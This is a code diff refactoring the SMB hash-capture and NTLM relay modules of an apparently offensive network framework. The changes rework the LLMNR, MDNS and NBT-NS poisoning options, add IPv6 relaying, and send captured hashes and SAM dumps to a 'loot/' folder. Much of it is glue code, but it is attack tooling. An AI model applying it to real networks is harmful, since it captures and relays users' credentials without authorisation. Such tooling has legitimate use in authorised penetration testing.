@@ -123,17 +123,17 @@ class SmbServerAttack(CommandSet):
 
         if not args.Asynchronous:
             self.__synchronous_attack()
-    def __poison_configuration(self,args:argparse.Namespace)->dict:
 
-        poison_selector = {"MDNS": 1, "NBT_NS": 1, "LLMNR": 1}
-        if(not args.mdns):
-            poison_selector["MDNS"] = 0
-        if (not args.nbt_ns):
-            poison_selector["NBT_NS"] = 0
-        if (not args.nbt_ns):
-            poison_selector["NBT_NS"] = 0
+    def __poison_configuration(self, args: argparse.Namespace) -> dict:
+
+        poison_selector = {"MDNS": 0, "NBT_NS": 0, "LLMNR": 0}
+        if args.mdns:
+            poison_selector["MDNS"] = 1
+        if args.nbt_ns:
+            poison_selector["NBT_NS"] = 1
+        if args.llmnr:
+            poison_selector["LLMNR"] = 1
         return poison_selector
-
 
     def __creating_components(self, args: argparse.Namespace) -> None:
         """[ Method to create the necessary classes ]
@@ -141,14 +141,14 @@ class SmbServerAttack(CommandSet):
             args (argparse.Namespace): [ Arguments passed to the attack ]
 
         """
-        poison_selector = self.__poison_selector(args)
+        poison_selector = self.__poison_configuration(args)
         self.__poison_launcher = PoisonLauncher(
             self._cmd.LHOST,
             self._cmd.IPV6,
             self._cmd.MAC_ADDRESS,
             self._cmd.INTERFACE,
             self._cmd.info_logger,
-            args.asynchronous,
+            args.Asynchronous,
             poison_selector,
         )
 
@@ -191,48 +191,56 @@ class SmbServerAttack(CommandSet):
     argParser = Cmd2ArgumentParser(
         description="""Malicious smb server attack to get hashes net-NTLMV """
     )
-    argParser.add_argument(
+
+    display_options = argParser.add_argument_group(
+        " Arguments for displaying information "
+    )
+    display_options.add_argument(
         "-SS",
         "--show_settable",
         action="store_true",
         help="Show Settable variables for this command",
     )
-    argParser.add_argument(
+
+    run_options = argParser.add_argument_group(" Arguments for ways to run a program ")
+    run_options.add_argument(
         "-A",
         "--Asynchronous",
         action="store_true",
         help="Perform the attack in the background. The results will be saved in log/hashes_ntlm",
     )
-    argParser.add_argument(
+
+    attack_options = argParser.add_argument_group(" Options to modify attack behavior")
+    attack_options.add_argument(
         "-E",
         "--end_attack",
         action="store_true",
         help="End the attack in the background process",
     )
-    argParser.add_argument(
+    attack_options.add_argument(
         "-ON",
         "--output_ntlmv2",
         action="store",
-        default=".",
+        default="loot/",
         help="Output of the hashes ntlmv2",
     )
-    argParser.add_argument(
+    attack_options.add_argument(
         "-L",
         "--llmnr",
         action="store_true",
-        help="To not use llmnr poisoning",
+        help="To use llmnr poisoning",
     )
-    argParser.add_argument(
+    attack_options.add_argument(
         "-M",
-        "--MDNS",
+        "--mdns",
         action="store_true",
-        help="To not use MDNS poisoning",
+        help="To use MDNS poisoning",
     )
-    argParser.add_argument(
+    attack_options.add_argument(
         "-N",
         "--nbt_ns",
         action="store_true",
-        help="To notTo not use NBT_NS poisoningg",
+        help="To use NBT_NS poisoning",
     )
 
     @with_argparser(argParser)
@@ -280,7 +288,7 @@ class NtlmRelay(CommandSet):
 
     def __init__(self):
         super().__init__()
-        self.__mdns_poisoner = None
+        self.__poison_launcher = None
         self.__smb_relay_server = None
         self.__ntlm_relay_process = None
 
@@ -369,7 +377,6 @@ class NtlmRelay(CommandSet):
 
         if args.Asynchronous:
             sys.stdout = open("/dev/null", "w")
-            self.__mdns_poisoner.logger_level = "DEBUG"
             signal.signal(signal.SIGINT, signal.SIG_IGN)
 
     def __checking_proxy_options(self, args: argparse.Namespace) -> None:
@@ -395,18 +402,6 @@ class NtlmRelay(CommandSet):
         self.__checking_asynchronous_options(args)
         self.__checking_proxy_options(args)
 
-    def __start_poisoners(self):
-        """[ Metod to start poisoners ]"""
-        mdns_thread = Thread(target=self.__mdns_poisoner.start_mdns_poisoning)
-        mdns_thread.daemon = True
-        mdns_thread.start()
-        llmnr_thread = Thread(target=self.__llmnr_poisoner.start_llmnr_poisoning)
-        llmnr_thread.daemon = True
-        llmnr_thread.start()
-        nbt_ns_thread = Thread(target=self.__nbt_ns_poisoner.start_nbt_ns_poisoning)
-        nbt_ns_thread.daemon = True
-        nbt_ns_thread.start()
-
     def __launch_necessary_components(self, args: argparse.Namespace) -> None:
         """[ Method that check options of the attack and  launch the threads that will control the mdns poisoner and the smb server ]
 
@@ -414,7 +409,7 @@ class NtlmRelay(CommandSet):
             args (argparse.Namespace): [ Arguments passed to the attack ]
         """
         self.__checking_attack_options(args)
-        self.__start_poisoners()
+        self.__poison_launcher.start_poisoners()
         self.__smb_relay_server.start_smb_relay_server()
 
     def __synchronous_attack(self):
@@ -427,8 +422,12 @@ class NtlmRelay(CommandSet):
             self.__ntlm_relay_process = None
             self._cmd.error_logger.warning("Exiting smb relay attack ...")
 
-    def __configure_ntlm_relay_attack(self) -> None:
-        """[ Method to configure the class NTLMRelayxConfig ]"""
+    def __configure_ntlm_relay_attack(self, args: argparse.Namespace) -> None:
+        """[ Method to configure the class NTLMRelayxConfig
+        Args:
+            args (argparse.Namespace): [ Arguments passed to the attack ]
+
+        ]"""
         target = TargetsProcessor(
             singleTarget=self._cmd.RHOST,
             protocolClients=self.__clients,
@@ -441,6 +440,8 @@ class NtlmRelay(CommandSet):
         self.__config.setProtocolClients(self.__clients)
         self.__config.setSMB2Support(True)
         self.__config.interfaceIp = self._cmd.LHOST
+        if args.ipv6:
+            self.__config.setIPv6(True)
 
     def __store_sam_results_of_target(self) -> None:
         """[method to save the attack output to a file]"""
@@ -469,7 +470,7 @@ class NtlmRelay(CommandSet):
                 "The file will be overwrite, do you want to continue ?(press 'y' to continue but any)"
             )
             output = input()
-            if output == "y" or output == "yes":
+            if output in ("y", "yes"):
                 exit = False
         else:
             exit = False
@@ -526,6 +527,17 @@ class NtlmRelay(CommandSet):
 
         return True
 
+    def __poison_configuration(self, args: argparse.Namespace) -> dict:
+
+        poison_selector = {"MDNS": 0, "NBT_NS": 0, "LLMNR": 0}
+        if args.mdns:
+            poison_selector["MDNS"] = 1
+        if args.nbt_ns:
+            poison_selector["NBT_NS"] = 1
+        if args.llmnr:
+            poison_selector["LLMNR"] = 1
+        return poison_selector
+
     def __creating_components(self, args: argparse.Namespace) -> None:
         """[ Method to configure the classes to use ]
 
@@ -533,16 +545,18 @@ class NtlmRelay(CommandSet):
             args (argparse.Namespace): [ Arguments passed to the attack ]
 
         """
-
-        self.__mdns_poisoner = MDNS(
+        poison_selector = self.__poison_configuration(args)
+        self.__poison_launcher = PoisonLauncher(
             self._cmd.LHOST,
             self._cmd.IPV6,
             self._cmd.MAC_ADDRESS,
             self._cmd.INTERFACE,
             self._cmd.info_logger,
+            args.Asynchronous,
+            poison_selector,
         )
 
-        self.__configure_ntlm_relay_attack()
+        self.__configure_ntlm_relay_attack(args)
 
         self.__smb_relay_server = SmbRelayServer(
             self.__config,
@@ -571,7 +585,7 @@ class NtlmRelay(CommandSet):
     def __show_connections(self) -> None:
         """[ Method to display captured connections ]"""
         if self.__ntlm_relay_process is not None:
-            url = "http://192.168.253.135:9090/ntlmrelayx/api/v1.0/relays"
+            url = f"http://{self._cmd.LHOST}:9090/ntlmrelayx/api/v1.0/relays"
             try:
                 response = get(url)
                 headers = ["Protocol", "Target", "Username", "Admin", "Port"]
@@ -617,43 +631,75 @@ class NtlmRelay(CommandSet):
     argParser = Cmd2ArgumentParser(
         description="""Command to perform ntlm relay attack"""
     )
-    argParser.add_argument(
+
+    display_options = argParser.add_argument_group(
+        " Arguments for displaying information "
+    )
+    display_options.add_argument(
         "-SS",
         "--show_settable",
         action="store_true",
         help="Show Settable variables for this command",
     )
-    argParser.add_argument(
+
+    display_options.add_argument(
+        "-SC",
+        "--show_connections",
+        action="store_true",
+        help="Show current connections of the sock server",
+    )
+
+    run_options = argParser.add_argument_group(" Arguments for ways to run a program ")
+    run_options.add_argument(
         "-A",
         "--Asynchronous",
         action="store_true",
         help="Perform the attack in the background",
     )
 
-    argParser.add_argument(
+    attack_options = argParser.add_argument_group(" Options to modify attack behavior")
+    attack_options.add_argument(
         "-P",
         "--proxy",
         action="store_true",
         help="Use a proxy server",
     )
-    argParser.add_argument(
+    attack_options.add_argument(
         "-OS",
         "--output_sam",
         action="store",
-        default=".",
+        default="loot/",
         help="Output from the sam hashes",
     )
-    argParser.add_argument(
+    attack_options.add_argument(
         "-E",
         "--end_attack",
         action="store_true",
         help="End the attack in the background process",
     )
-    argParser.add_argument(
-        "-SC",
-        "--show_connections",
+    attack_options.add_argument(
+        "-L",
+        "--llmnr",
         action="store_true",
-        help="Show current connections of the sock server",
+        help="To use llmnr poisoning",
+    )
+    attack_options.add_argument(
+        "-M",
+        "--mdns",
+        action="store_true",
+        help="To use MDNS poisoning",
+    )
+    attack_options.add_argument(
+        "-N",
+        "--nbt_ns",
+        action="store_true",
+        help="To use NBT_NS poisoning",
+    )
+    attack_options.add_argument(
+        "-IP6",
+        "--ipv6",
+        action="store_true",
+        help="To attack with ipv6",
     )
 
     @with_argparser(argParser)
